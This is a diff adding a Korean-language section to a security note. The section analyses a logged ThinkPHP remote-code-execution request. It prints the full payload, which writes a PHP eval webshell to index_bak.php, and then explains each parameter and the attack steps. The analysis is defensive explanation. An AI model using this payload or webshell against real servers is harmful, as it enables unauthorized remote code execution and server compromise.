@@ -213,3 +213,110 @@ echo error303;
 
 * \*\*`eval($_REQUEST['pass']);`\*\*는 사용자가 **HTTP 요청**으로 보낸 **문자열**을 PHP 코드처럼 실행하는 방식입니다. 이는 **XSS**나 **RCE** 공격의 가능성을 염두에 두고 취약점이 됩니다.
 
+---
+
+## **📌 예시 코드 3: 난독화된 PHP 코드와 `eval()`**
+
+서버에 PHP 파일을 **쓰기/설치**해서 서버에서 임의 코드를 실행하게 하는 **서버측 원격 코드 실행(RCE) / 웹셸 설치** 시도
+
+```
+@eval(,http://land/index.php?s\=/Index/ hinkpp/invokefunction&function\�ll_user_func_array&vars[0]\=file_put_contents&vars[1][]\=index_bak.php&vars[1][]\=<?php @eval($_POST['pwd']);?>hellohello9527527
+```
+원문은 이스케이프/인코딩 문자가 섞여 있으므로, 사람이 읽기 쉬운 형태로 복원하면 다음과 같이 해석됩니다
+
+```
+@eval(,http://land/index.php?s=/Index/hinkpp/invokefunction
+  &function=call_user_func_array
+  &vars[0]=file_put_contents
+  &vars[1][]=index_bak.php
+  &vars[1][]=<?php @eval($_POST['pwd']);?>hellohello9527527
+| GET | https://community.com/
+```
+
+* 실제로는 일부 철자(예: `hinkpp` — 아마 `thinkphp` 오타 또는 의도적 변형), 제어문자(`\=` 같은 이스케이프)나 문자 깨짐이 섞여 있습니다.
+* 공격의 핵심은 `function=call_user_func_array` 와 `vars[...]` 인자를 통해 **임의 함수 호출**(여기서는 `file_put_contents`)을 시도하는 점입니다.
+
+
+
+### `@eval(`
+
+* `@` : PHP에서 에러 억제 연산자. 에러/경고 메시지 출력을 숨깁니다. 공격자가 실패 로그를 숨기려 사용.
+* `eval` : PHP 코드 문자열을 실행하는 함수. 매우 위험. (여기서는 문자열의 일부로 들어간 듯 — 전체 맥락에서 `@eval` 직접 호출 목적일 수도 있음)
+
+> 결론: 공격자는 에러 숨기기와 동적 코드 실행을 염두에 둡니다.
+
+
+### `http://land/index.php?s=/Index/hinkpp/invokefunction`
+
+* 이 부분은 공격이 향하는 **대상 URL / 엔드포인트**입니다.
+* `s=/Index/hinkpp/invokefunction` : 프레임워크 라우팅 파라미터로 보임. ThinkPHP 계열에서 `s` 파라미터로 컨트롤러/액션을 지정하는 패턴이 자주 사용됩니다.
+
+  * `invokefunction` : 이름에서 알 수 있듯 **함수 호출을 리모트로 수행**하도록 만든 취약 기능(또는 취약한 디버그 엔드포인트)을 노린 것일 가능성이 큽니다.
+  * `hinkpp` 는 `thinkphp` 오타 또는 우회 문자열일 수 있습니다(공격자는 종종 버전 차이나 필터를 피하려 철자변형 사용).
+
+> 결론: 공격자는 특정 프레임워크/버전의 취약점을 노려 원격 함수 호출을 시도합니다.
+
+
+### `&function=call_user_func_array`
+
+* `call_user_func_array` 는 PHP 내장 함수로, 첫 인자로 전달된 함수명을 호출하고 두번째 인자로 인자 배열을 전달합니다.
+
+  * 예: `call_user_func_array('f', ['a','b'])` → `f('a','b')`
+* 이 파라미터가 외부 입력으로 서버에 전달되어 검증 없이 사용된다면, 공격자는 **임의의 PHP 함수 호출**이 가능합니다.
+
+> 결론: 공격의 핵심—공격자는 이를 통해 서버에서 원하는 PHP 함수를 실행하려 함 (`file_put_contents` 등).
+
+
+### `&vars[0]=file_put_contents`
+
+* `vars` 는 `call_user_func_array`에 전달될 인자 배열을 구성합니다.
+* `vars[0] = file_put_contents` → 호출할 함수 이름(또는 호출 대상)이 `file_put_contents` 로 설정됩니다.
+
+  * 즉 `call_user_func_array`가 실제로는 `file_put_contents( ... )` 를 실행하도록 만들려는 의도입니다.
+
+> 결론: 공격자는 서버에 파일을 쓰기(create/overwrite)하려 합니다.
+
+
+### `&vars[1][]=index_bak.php`
+
+* `vars[1][]` 는 `file_put_contents`에 전달될 첫번째 인자(파일명)입니다.
+* `index_bak.php` 라는 파일을 **웹 루트** 또는 현재 작업 디렉토리에 생성/덮어쓰려 함.
+
+> 결론: 생성될 파일명(백업·웹셸용 이름). 공격자는 흔히 `*_bak.php`, `tmp.php` 같은 이름을 씁니다.
+
+
+### `&vars[1][]=<?php @eval($_POST['pwd']);?>hellohello9527527`
+
+* `vars[1][]` 의 두번째 요소(내용). 즉 `file_put_contents('index_bak.php', '<contents>')`
+* 실제 내용은:
+
+  * `<?php @eval($_POST['pwd']);?>` : 전형적인 **웹셸**. POST 파라미터 `pwd` 로 받은 값을 `eval`로 실행시키는 백도어.
+
+    * 공격자는 HTTP POST로 PHP 코드를 보내 원격에서 명령 실행 가능.
+  * `hellohello9527527` : 보통은 **마커(marker)** 또는 탐지 우회용 추가 텍스트(검사/식별을 위한 시그니처) — 나중에 존재 여부로 성공 여부 확인 가능.
+
+> 결론: 서버에 웹셸을 생성해 원격 명령 실행을 얻으려는 목적이 명확.
+
+
+### `| GET | https://community.com/`
+
+* 로그 형식으로 보이는 부분:
+
+  * 요청 방식: `GET`
+  * 요청 호스트/리퍼러 등: `https://community.com/`
+* 공격자는 이 GET 요청으로 취약 엔드포인트에 위 파라미터들을 전달해 `file_put_contents`를 실행시키려 함.
+
+> 결론: GET으로 전송된 파라미터만으로 `file_put_contents` 호출이 가능하다면 즉시 RCE/웹셸 설치 성공 위험.
+
+
+# 실제 공격 흐름
+
+1. 공격자가 `https://community.com/index.php?s=/Index/.../invokefunction`에 쿼리 파라미터로 `function=call_user_func_array` 와 `vars[...]` 를 보냄.
+2. 취약한 서버 코드가 `function`/`vars`를 검증 없이 사용하여 `call_user_func_array`를 호출.
+3. 결과적으로 `file_put_contents('index_bak.php', '<?php @eval($_POST['pwd']);?>hellohello9527527')`가 실행되어 파일이 생성됨.
+4. 공격자는 이후 `POST /index_bak.php` 에 `pwd` 파라미터에 임의 PHP 코드를 담아 원격으로 코드 실행.
+
+
+
+
+
